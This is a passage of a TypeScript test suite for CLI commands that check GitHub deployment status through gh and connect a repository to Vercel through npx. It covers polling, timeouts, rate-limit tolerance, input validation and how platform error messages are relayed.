    const summary = c.json() as { error: string; status: string };
    expect(summary.error).toContain('gh CLI not found');
  });

  it('no GitHub origin and no --repo → validation error naming the fix', async () => {
    const c = collect();
    const err = (await runCiDoctor(doctorOpts(), {
      spawn: () => spawnResult({ status: 1 }), // not a git repo
      cwd: '/tmp',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;
    expect(err).toMatchObject({ exitCode: 5 });
    // The actionable half lives in nextAction — localValidationError's own
    // `message` is the generic "Invalid request."
    expect(err.nextAction).toContain('--repo');
  });

  it('--wait polls while there are no events, and stops as soon as one appears', async () => {
    const c = collect();
    let calls = 0;
    const spawn: SpawnImpl = (cmd, args) => {
      if (cmd === 'git' && args[0] === 'remote') {
        return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
      }
      calls += 1;
      // The first two reads see nothing (the deploy is still building), the
      // third sees the first event land.
      return spawnResult({ stdout: JSON.stringify(calls >= 3 ? recent() : []) });
    };
    const slept: number[] = [];

    await runCiDoctor(doctorOpts({ wait: true }), {
      spawn,
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
      sleep: async ms => {
        slept.push(ms);
      },
    });

    expect(calls).toBe(3);
    expect(slept).toHaveLength(2);
    expect(c.json()).toMatchObject({
      status: 'linked',
      ok: true,
      newDeployment: { environment: 'Preview' },
    });
  });

  it('--wait succeeds on a NEW record even when it is a production deployment', async () => {
    // The doctor's own next steps say "push a commit" — on a default branch
    // that lands as a PRODUCTION deployment. The wait's success condition is
    // the hard fact "a new record arrived", not the preview heuristic, so that
    // flow must exit 0 rather than 1 with "enable preview deployments".
    const c = collect();
    let calls = 0;
    const spawn: SpawnImpl = (cmd, args) => {
      if (cmd === 'git' && args[0] === 'remote') {
        return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
      }
      calls += 1;
      return spawnResult({
        stdout: JSON.stringify(
          calls >= 2
            ? [{ environment: 'Production', created_at: new Date().toISOString(), creator: null }]
            : [],
        ),
      });
    };

    await runCiDoctor(doctorOpts({ wait: true }), {
      spawn,
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
      sleep: async () => {},
    });

    // Exit 0 (no throw), and the summary still carries the classification so
    // the caller learns a PR gate additionally needs previews.
    expect(c.json()).toMatchObject({
      status: 'production-only',
      ok: false,
      newDeployment: { environment: 'Production' },
    });
  });

  it('--wait only counts records NEWER than the baseline, not what was already there', async () => {
    vi.useFakeTimers();
    try {
      const history = recent();
      const c = collect();
      let calls = 0;
      const spawn: SpawnImpl = (cmd, args) => {
        if (cmd === 'git' && args[0] === 'remote') {
          return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
        }
        calls += 1;
        // The same pre-existing history on every read: nothing new ever arrives.
        return spawnResult({ stdout: JSON.stringify(history) });
      };

      await runCiDoctor(doctorOpts({ wait: true, waitTimeoutSeconds: 31 }), {
        spawn,
        cwd: '/repo',
        stdout: c.stdout,
        stderr: c.stderr,
        sleep: async ms => {
          vi.advanceTimersByTime(ms);
        },
      });

      // Times out without a new record; the verdict from the existing history
      // (linked) still decides the exit code.
      expect(calls).toBeGreaterThan(1);
      expect(c.json()).toMatchObject({ status: 'linked', ok: true, newDeployment: null });
    } finally {
      vi.useRealTimers();
    }
  });

  it('--wait tolerates a transient gh failure mid-watch instead of aborting', async () => {
    const c = collect();
    let calls = 0;
    const spawn: SpawnImpl = (cmd, args) => {
      if (cmd === 'git' && args[0] === 'remote') {
        return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
      }
      calls += 1;
      // Read 2 is a rate-limit blip; read 3 sees the record land.
      if (calls === 2) return spawnResult({ status: 1, stderr: 'HTTP 429: rate limited' });
      return spawnResult({ stdout: JSON.stringify(calls >= 3 ? recent() : []) });
    };

    await runCiDoctor(doctorOpts({ wait: true }), {
      spawn,
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
      sleep: async () => {},
    });

    expect(calls).toBe(3);
    expect(c.json()).toMatchObject({ status: 'linked', ok: true, error: null });
  });

  it('--wait still exits 10 when the deadline expires with no successful read at all', async () => {
    vi.useFakeTimers();
    try {
      const c = collect();
      const spawn: SpawnImpl = (cmd, args) => {
        if (cmd === 'git' && args[0] === 'remote') {
          return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
        }
        return spawnResult({ status: 1, stderr: 'HTTP 429: rate limited' });
      };
      const err = (await runCiDoctor(doctorOpts({ wait: true, waitTimeoutSeconds: 31 }), {
        spawn,
        cwd: '/repo',
        stdout: c.stdout,
        stderr: c.stderr,
        sleep: async ms => {
          vi.advanceTimersByTime(ms);
        },
      }).catch((e: unknown) => e)) as ApiError;
      expect(err).toMatchObject({ exitCode: 10 });
    } finally {
      vi.useRealTimers();
    }
  });

  it('--wait gives up at the timeout instead of polling forever', async () => {
    const c = collect();
    const spawn = ghSpawn([]);
    const err = (await runCiDoctor(doctorOpts({ wait: true, waitTimeoutSeconds: 1 }), {
      spawn,
      cwd: '/repo',
      stdout: c.stdout,
      stderr: c.stderr,
      sleep: async () => {},
    }).catch((e: unknown) => e)) as ApiError;
    expect(err).toMatchObject({ exitCode: 1 });
  });

  it('--timeout without --wait is refused, not silently ignored', async () => {
    const err = (await runCiDoctor(doctorOpts({ waitTimeoutSeconds: 60 }), {
      spawn: ghSpawn(recent()),
      cwd: '/repo',
    }).catch((e: unknown) => e)) as ApiError;
    expect(err).toMatchObject({ exitCode: 5 });
    expect(err.nextAction).toContain('--wait');
  });

  it('--repo refuses `.`/`..` path segments the character class alone would admit', async () => {
    const err = (await runCiDoctor(doctorOpts({ repo: '../..' }), {
      spawn: ghSpawn(recent()),
      cwd: '/repo',
    }).catch((e: unknown) => e)) as ApiError;
    expect(err).toMatchObject({ exitCode: 5 });
  });

  it('asks gh for the full 100-record page (a short page fakes production-only)', async () => {
    const paths: string[] = [];
    const spawn: SpawnImpl = (cmd, args) => {
      if (cmd === 'git' && args[0] === 'remote') {
        return spawnResult({ stdout: `git@github.com:${REPO}.git\n` });
      }
      if (cmd === 'gh') paths.push(args[1] ?? '');
      return spawnResult({ stdout: JSON.stringify(recent()) });
    };
    const c = collect();
    await runCiDoctor(doctorOpts(), { spawn, cwd: '/repo', stdout: c.stdout, stderr: c.stderr });
    expect(paths).toEqual([`repos/${REPO}/deployments?per_page=100`]);
  });
});

describe('runCiConnect', () => {
  // Keyed via join() so the lookup also matches on Windows path separators.
  const LINKED_FS = { [join('/repo', '.vercel', 'project.json')]: '{"projectId":"prj_1"}' };

  function connectOpts(over: Partial<typeof base & { project?: string }> = {}) {
    return { ...base, output: 'text' as const, ...over };
  }

  it('a linked directory goes straight to `git connect` — no link step, no `--yes` anywhere', async () => {
    const c = collect();
    const ran: string[][] = [];
    const spawn: SpawnImpl = (cmd, args) => {
      ran.push([cmd, ...args]);
      return spawnResult({ stdout: 'ok' });
    };

    await runCiConnect(connectOpts(), {
      spawn,
      cwd: '/repo',
      fs: makeFakeFs(LINKED_FS),
      platform: 'linux',
      stdout: c.stdout,
      stderr: c.stderr,
    });

    // Every step goes through the platform's own CLI — we never hold a token.
    expect(ran.map(r => r.join(' '))).toEqual([
      'npx --yes vercel@59 git connect --non-interactive',
    ]);
    expect(c.out.join('\n')).toContain('Connected Vercel');
  });

  it('an unlinked directory + --project links that EXISTING project, then connects', async () => {
    const c = collect();
    const ran: string[][] = [];
    const spawn: SpawnImpl = (cmd, args) => {
      ran.push([cmd, ...args]);
      return spawnResult({ stdout: 'ok' });
    };

    await runCiConnect(connectOpts({ project: 'storefront' }), {
      spawn,
      cwd: '/repo',
      fs: makeFakeFs(),
      platform: 'linux',
      stdout: c.stdout,
      stderr: c.stderr,
    });

    expect(ran.map(r => r.join(' '))).toEqual([
      'npx --yes vercel@59 link --project storefront --non-interactive',
      'npx --yes vercel@59 git connect --non-interactive',
    ]);
    // `--yes` must never reach the Vercel CLI: on an unlinked directory it
    // CREATES a project named after the cwd — the stray project `ci doctor`
    // would then report as `linked`.
    for (const call of ran) {
      expect(call.slice(3)).not.toContain('--yes');
    }
  });

  it('an unlinked directory WITHOUT --project refuses — it never picks or creates a project', async () => {
    const c = collect();
    let spawned = 0;
    const err = (await runCiConnect(connectOpts(), {
      spawn: () => {
        spawned += 1;
        return spawnResult();
      },
      cwd: '/repo',
      fs: makeFakeFs(),
      platform: 'linux',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;

    expect(spawned).toBe(0);
    expect(err).toMatchObject({ exitCode: 1 });
    expect(err.message).toContain('--project');
    expect(err.message).toContain('vercel link');
  });

  it('a --project name Vercel could not accept is a validation error before anything runs', async () => {
    let spawned = 0;
    const err = (await runCiConnect(connectOpts({ project: 'Bad Name!' }), {
      spawn: () => {
        spawned += 1;
        return spawnResult();
      },
      cwd: '/repo',
      fs: makeFakeFs(),
      platform: 'linux',
    }).catch((e: unknown) => e)) as ApiError;
    expect(spawned).toBe(0);
    expect(err).toMatchObject({ exitCode: 5 });
  });

  it('already-connected is a success, and doubles as the answer doctor cannot get', async () => {
    const c = collect();
    const spawn: SpawnImpl = (cmd, args) =>
      args.includes('connect')
        ? spawnResult({ status: 1, stderr: 'Error: The repository is already connected.' })
        : spawnResult();

    await runCiConnect(connectOpts(), {
      spawn,
      cwd: '/repo',
      fs: makeFakeFs(LINKED_FS),
      platform: 'linux',
      stdout: c.stdout,
      stderr: c.stderr,
    });
    expect(c.out.join('\n')).toContain('already connected');
    // The follow-up tells the user the remaining possibility: not deployed yet.
    expect(c.err.join('\n')).toContain('has not deployed yet');
  });

  it('relays a --non-interactive JSON refusal, next steps included (e.g. not logged in)', async () => {
    const c = collect();
    const spawn: SpawnImpl = (cmd, args) =>
      args.includes('connect')
        ? spawnResult({
            status: 1,
            stdout: JSON.stringify({ reason: 'not_authorized', next: ['npx vercel login'] }),
          })
        : spawnResult();

    const err = (await runCiConnect(connectOpts(), {
      spawn,
      cwd: '/repo',
      fs: makeFakeFs(LINKED_FS),
      platform: 'linux',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;

    expect(err).toMatchObject({ exitCode: 1 });
    // Vercel's own instructions beat anything we could paraphrase.
    expect(err.message).toContain('not_authorized');
    expect(err.message).toContain('npx vercel login');
  });

  it('relays the platform CLI’s own failure line (App not installed / no permission need a human)', async () => {
    const c = collect();
    const spawn: SpawnImpl = (cmd, args) =>
      args.includes('connect')
        ? spawnResult({
            status: 1,
            stderr: 'Error: You must install the Vercel GitHub App: https://github.com/apps/vercel',
          })
        : spawnResult();

    const err = (await runCiConnect(connectOpts(), {
      spawn,
      cwd: '/repo',
      fs: makeFakeFs(LINKED_FS),
      platform: 'linux',
      stdout: c.stdout,
      stderr: c.stderr,
    }).catch((e: unknown) => e)) as ApiError;

    // Paraphrasing would drop the URL the user needs to open.
    expect(err.message).toContain('https://github.com/apps/vercel');
  });

  it('on Windows npx runs as its `.cmd` shim through the shell (spawnSync cannot launch it bare)', async () => {
    const c = collect();
    const calls: Array<{ cmd: string; shell?: boolean }> = [];
    const spawn: SpawnImpl = (cmd, _args, opts) => {
      calls.push({ cmd, shell: opts.shell });
      return spawnResult({ stdout: 'ok' });
    };

    await runCiConnect(connectOpts(), {
      spawn,
      cwd: '/repo',
      fs: makeFakeFs(LINKED_FS),
      platform: 'win32',
      stdout: c.stdout,
      stderr: c.stderr,
    });

    expect(calls).toEqual([{ cmd: 'npx.cmd', shell: true }]);
  });
});
